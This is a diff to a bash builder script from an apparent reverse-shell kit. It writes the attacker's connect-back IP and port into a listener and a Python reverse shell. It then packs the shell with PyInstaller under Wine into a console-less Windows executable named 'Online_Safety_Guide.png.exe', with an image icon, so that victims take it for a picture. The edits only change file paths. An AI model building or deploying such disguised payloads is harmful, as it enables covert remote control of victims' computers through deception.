@@ -1,9 +1,10 @@
 #!/bin/bash
 
 # !!! RUN THE SCRIPT AS ROOT !!!
-
-handler=Scripts/server.py
-rev_sh=Scripts/reverse_shell.py
+# $(dirname "$0") shows the current directory path of the script
+# $0 is the name of the script itself - so it returns the current directory
+handler=$(dirname "$0")/Scripts/server.py
+rev_sh=$(dirname "$0")/Scripts/reverse_shell.py
 
 #====================================================================================================================================================
 # GETTING USER INPUT FOR LISTENING HOST AND PORT ADDRESSES		-		CAN BE LEFT EMPTY FOR ATTACKS WITHIN THE LAN
@@ -53,6 +54,7 @@ echo "------------------------"
 echo
 echo "[*] You can leave the following fields empty if carrying out attacks within the LAN."
 echo "[*] For over the network attacks, YOU MUST SPECIFY proper address and port number"
+echo
 echo "for the payload to connect back to."
 echo
 read -p "Enter the IP address to connect back to : " connect_ip
@@ -92,11 +94,12 @@ sed -i 's/listen_port = .*/listen_port = '$listen_port'/' $handler
 sed -i 's/conn_port = .*/conn_port = '$connect_port'/' $rev_sh
 
 
+# OPTIONS AND DOCUMENTATION FOR BELOW COMMANDS AT WINE HELP - Command: "wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe -h"
 
-wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "/home/voldemort/Desktop/pythonScripts/Reverse_Shell/Res/Online_Safety_Guide.png;." --onefile --noconsole --icon /home/voldemort/Desktop/pythonScripts/Reverse_Shell/Res/Icons/img.ico -n Online_Safety_Guide.png Scripts/reverse_shell.py
+wine /root/.wine/drive_c/Python27/Scripts/pyinstaller.exe --add-data "$(dirname "$0")/Res/Online_Safety_Guide.png;." --onefile --noconsole --icon $(dirname "$0")/Res/Icons/img.ico --distpath $(dirname "$0")/dist --workpath $(dirname "$0")/build --specpath $(dirname "$0") -n Online_Safety_Guide.png $(dirname "$0")/Scripts/reverse_shell.py
 
-cp dist/Online_Safety_Guide.png.exe Online_Safety_Guide.png.exe
-rm -r dist/ build/ Online_Safety_Guide.png.spec
+cp $(dirname "$0")/dist/Online_Safety_Guide.png.exe ./Online_Safety_Guide.png.exe
+rm -r $(dirname "$0")/dist/ $(dirname "$0")/build/ $(dirname "$0")/Online_Safety_Guide.png.spec
 echo "[+] Generated payload saved at : "$(pwd)
 
 read -p "Press Y when you're ready to launch the handler..." resp
